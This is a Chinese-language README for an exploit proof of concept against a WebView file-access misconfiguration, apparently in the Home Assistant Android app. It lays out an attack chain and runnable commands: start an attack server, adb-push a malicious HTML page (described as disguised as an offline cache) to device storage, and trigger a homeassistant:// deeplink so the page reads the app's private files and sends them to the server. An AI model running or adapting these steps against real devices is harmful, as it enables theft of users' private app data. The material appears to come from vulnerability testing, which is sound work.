# EXP: 2.1.1 File Access Misconfiguration

## 漏洞概述

WebView 启用了 `allowFileAccess` + `allowUniversalAccessFromFileURLs`，允许 `file://` 协议页面跨域读取本地文件。攻击者将恶意 HTML 放入设备存储，通过 Deeplink 加载后，利用 XMLHttpRequest 跨域窃取 App 私有文件。

## 攻击流程

```
1. 攻击者让受害者下载恶意 HTML → /sdcard/Download/exploit.html
2. Deeplink 加载: homeassistant://webview?url=file:///sdcard/Download/exploit.html
3. HTML 通过 XMLHttpRequest 读取 file:// 协议下的 App 私有文件
4. 数据回传攻击服务器
```

## 启动服务

```bash
cd exp/home-assistant/2.1.1_File_Access_Misconfiguration
python server.py
```

## 文件结构

```
2.1.1_File_Access_Misconfiguration/
├── server.py          # 攻击服务器（HTTP :8000）
├── exp/
│   └── 2.1.1.html     # 恶意页面（伪装"离线面板缓存"）
├── received/          # 回收的数据（自动生成）
└── readme.md          # 本文件
```

## 验证步骤

```bash
# 1. 启动攻击服务器
cd exp/home-assistant/2.1.1_File_Access_Misconfiguration
python server.py

# 2. 下载恶意 HTML 到模拟器
adb push exp/2.1.1.html /sdcard/Download/exploit.html

# 3. 触发 Deeplink（加载本地 file:// 页面）
adb shell am start -a android.intent.action.VIEW \
  -d "homeassistant://webview?url=file:///sdcard/Download/exploit.html"

# 4. 查看回收数据
dir received\
```

## 预期结果

`received/` 目录出现数据文件，内容包含通过 `file://` 跨域读取到的 App 私有文件内容。

## 注意事项

- `allowUniversalAccessFromFileURLs` 在 API 26+ 默认关闭，需代码显式开启
- 恶意 HTML 必须先存在于设备上（通过下载或 adb push）
- 不需要 Bridge，纯 WebView 配置漏洞
